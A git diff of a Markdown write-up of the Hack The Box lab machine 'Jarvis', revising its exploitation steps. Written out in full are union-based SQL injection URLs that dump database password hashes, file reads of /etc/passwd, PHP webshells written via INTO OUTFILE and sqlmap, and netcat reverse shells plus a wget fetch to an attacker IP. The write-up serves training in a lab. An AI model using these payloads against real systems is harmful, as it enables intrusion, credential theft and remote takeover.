@@ -66,6 +66,7 @@ gobuster dir -e -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.143/ -k 
 
 ## Exploitation: Method 1
 + Each room is directly referenced using the parameter **cod**, which could be a possible injection point, and check SQL Injection vulnerability.
++ **SQL injection can be really tricky but a lot less so with a proper methodology.** 
 + Add single quotation `'` at the end of **cod** parameter. It doesn't crash the page or return 500, but the picture of the room disappear anymore.
 + No errors appeared since SQL errors may be suppressed.
 + Try the time-based sqli, and check payload **cod=55 AND (SELECT 1 FROM (SELECT(SLEEP(60)))sqli)**.
@@ -99,7 +100,7 @@ gobuster dir -e -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.143/ -k 
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/27faad12-dbec-4ab1-9c6a-1506dabea596)
 
-+ **This means there is some SQL Injection to exploit.**
++ **This means there is some SQL Injection to exploit.** Our approach is to enumerate the DBs first, then select one and enumerate the tables, select one and list the interesting entries which hopefully contain admin credentials.
 
 
 ### Step 1: Column Enumeration
@@ -159,28 +160,28 @@ http://10.10.10.143/room.php?cod=55%20union%20select%201,@@version,@@datadir,use
 
 + Database is MariaDB 10.1.48. Next, tyr to print out the list of password hashes step by step.
 
-+ **List DBs:** List DBs using **group_concat()** which puts all the values from different rows into one string, and concats multiple rows of the same table with one query. Otherwise, you get nothing because of querying more than one column in the sub select query. In order to output multiple columns, you can use the group_concat() function.
++ **Enumerate DBs:** **List DBs** using **group_concat()** which puts all the values from different rows into one string, and concats multiple rows of the same table with one query. Otherwise, you get nothing because of querying more than one column in the sub select query. In order to output multiple columns, you can use the group_concat() function.
 ```
 http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(schema_name),4,5,6,7+from+information_schema.schemata;-- -
 ```
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/505dc514-807d-4b4f-917b-2c6481afb3a5)
 
-+ **Show Tables in hotel:** To list the tables in the hotel DB:
++ **Enumerate tables in specific DB:** List the tables in the hotel DB since the only non-standard DB is hotel.
 ```
 http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(table_name),4,5,6,7+from information_schema.tables+where+table_schema='hotel';-- -
 ```
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/221d44c9-2037-47dc-9f76-ce5706a659e0)
 
-+ **Show Columns in room:** Enumerate columns in table room:
++ **Enumerate columns in specific table:** Show columns in table room:
 ```
 http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(column_name),4,5,6,7+from+information_schema.columns+where+table_name='room';-- -
 ```
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/18e3b52f-57d8-474e-ad0c-3d15c5ef9bfd)
 
-+ **Show Tables in mysql:** There are no any usernames or creds in this DB. Control the default mysql DB, and see a lot of tables.
++ **Show Tables in mysql default db:** There are no any usernames or creds in this DB. Control the default mysql DB, and see a lot of tables.
 ```
 http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(table_name),4,5,6,7+from information_schema.tables+where+table_schema='mysql';-- -
 ```
@@ -195,14 +196,14 @@ http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(column_name),4
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/71ba464b-4c30-40df-aa35-7e572b9b91aa)
 
-+ **Get Username and Password Hashes:** There are some interesting columns, and then enumerate the entries for User, Password adding as data delimiters with:
++ **List all entries with specified columns - Get Username and Password Hashes:** There are some interesting columns, and then enumerate the entries for User, Password adding as data delimiters with:
 ```
-http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(User,":",Password),4,5,6,7+from+mysql.user;-- -
+http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(User,":",Password,":",File_priv),4,5,6,7+from+mysql.user;-- -
 
-http://10.10.10.143/room.php?cod=55+union+select+1,2,(SELECT group_concat(User,":",Password) FROM mysql.user),4,5,6,7;-- -
+http://10.10.10.143/room.php?cod=55+union+select+1,2,(SELECT group_concat(User,":",Password,":",File_priv) FROM mysql.user),4,5,6,7;-- -
 ```
 
-![image](https://github.com/h4md153v63n/CTFs/assets/5091265/982a4737-3951-4842-9cf8-5cba91bff2d8)
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/11708e5e-3119-4581-a55d-06b195ff009c)
 
 + Crack the hash with [crackstation](https://crackstation.net/), and credentials: `DBadmin`:`imissyou`.
 ```
@@ -249,7 +250,7 @@ database management system users password hashes:
 
 
 
-## Gaining Access: Method 1
+## Gaining Access: Method 1 - LFI
 + Get into the phpmyadmin site with the discovered credentials: `http://10.10.10.143/phpmyadmin/`
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/456d2ac4-4fe4-4dd2-adf1-fe2ed4706eeb)
@@ -285,14 +286,47 @@ select '<?php exec("wget -O /var/www/html/revshell.php http://10.10.14.8/revshel
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f9727c9b-435b-420b-8eb5-8397f61296fb)
 
-+ Trigger to get the shell `http://10.10.10.143/cmd.php?cmd=nc -e /bin/sh 10.10.14.8 4444`.
-+ Get low level shell, and see the **web daemon user (www-data)**'s privilege is **not** enough to view the content of the user flag.
++ Start a netcat listener on the attack machine: `nc -lnvp 4444`
++ Trigger to get the shell: `http://10.10.10.143/cmd.php?cmd=nc -e /bin/sh 10.10.14.8 4444`.
++ Get low level shell, and do [shell upgrade](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/26_Jarvis.md#shell-upgrade).
++ See the **web daemon user (www-data)**'s privilege is **not** enough to view the content of the user flag.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/12d48b82-8ec8-4d18-93a4-93d10aff2aa7)
 
 
 
-## Gaining Access: Method 2 - sqlmap
+## Gaining Access: Method 2 - SQLi
++ Try to view **/etc/passwd** file: 
+```
+http://10.10.10.143/room.php?cod=55+union+select+1,2,3,4,load_file("/etc/passwd"),6,7+FROM+mysql.user;-- -
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/10307fd8-cc78-4bf9-a87c-b7e43597a4f0)
+
++ Try to upload a basic shell file onto the webserver using [INTO OUTFILE()](https://www.exploit-db.com/papers/14635).
+```
+http://10.10.10.143/room.php?cod=55+union+select+1,2,3,4,'<?php echo system($_REQUEST ["cmd"]); ?>',6,7+INTO+OUTFILE+'/var/www/html/run.php';-- -
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/298419b7-1760-4e8e-937a-c4671e6be37e)
+
++ Visit `10.10.10.143/run.php?cmd=cat /etc/passwd`.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/cd1f8a7b-2849-4a7d-ac66-c4742536e98e)
+
++ Start a netcat listener on the attack machine: `nc -lnvp 5555`
++ Trigger to get the shell: `http://10.10.10.143/run.php?cmd=nc -e /bin/sh 10.10.14.8 5555`.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dbe55fae-79f6-4eda-b6ef-3282ef6135d2)
+
++ Get low level shell, and again [shell upgrade](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/26_Jarvis.md#shell-upgrade).
++ See the **web daemon user (www-data)**'s privilege is **not** enough to view the content of the user flag.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/367f423b-2b23-49fc-92be-58cda063afd0)
+
+
+
+## Gaining Access: Method 3 - sqlmap
 + Do the same phpmyadmin attack as shown [above](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/26_Jarvis.md#gaining-access-method-1). using sqlmap to write a webshell:
 ```
 sqlmap -u http://10.10.10.143:80/room.php?cod=5 --batch --dbs --random-agent --file-write shell.php --file-dest /var/www/html/shell.php
@@ -304,7 +338,7 @@ sqlmap -u http://10.10.10.143:80/room.php?cod=5 --batch --dbs --random-agent --f
 + Get the shell: `curl http://10.10.10.143/shell.php`
 
 
-## Gaining Access: Method 3 - sqlmap
+
 
 
 
@@ -427,10 +461,27 @@ WantedBy=multi-user.target
 
 
 # Technical Knowledge
-+ https://dev.mysql.com/doc/refman/5.7/en/select.html
-+ https://dev.mysql.com/doc/refman/8.0/en/information-schema.html
+**SQLi:**
++ **DB-Engines Ranking:** https://db-engines.com/en/ranking
++ https://ivanitlearning.wordpress.com/2018/12/22/exploiting-in-band-sql-injection/
++ https://ivanitlearning.wordpress.com/2020/02/10/vulnhub-kioptrix-lvl-3/
+  + https://kamransaifullah.medium.com/walkthrough-kioptrix-3-by-vulnhub-bdfb0fba64e1
++ https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+  + https://pentestmonkey.net/category/cheat-sheet/sql-injection
++ https://www.siteground.com/kb/what_is_the_information_schema_database/
+  + https://www.geeksforgeeks.org/mysql-group_concat-function/
+  + https://dev.mysql.com/doc/refman/5.7/en/select.html
+  + https://dev.mysql.com/doc/refman/8.0/en/information-schema.html
++ http://www.unixwiz.net/techtips/sql-injection.html
++ https://www.acunetix.com/websitesecurity/sql-injection2/
+  + https://www.acunetix.com/websitesecurity/sql-injection/
+
+**LFI:**
++ https://ivanitlearning.wordpress.com/2020/02/20/vulnhub-pwnos-2-0/
++ https://www.exploit-db.com/papers/14635
+
 + https://en.wikipedia.org/wiki/Systemd
-+ 
+
 
 
 # CVE Scripting
@@ -453,5 +504,5 @@ WantedBy=multi-user.target
 
 
 # For More
-+ xxx
++ https://en.wikipedia.org/wiki/History_of_Microsoft_SQL_Server#Release_summary
 
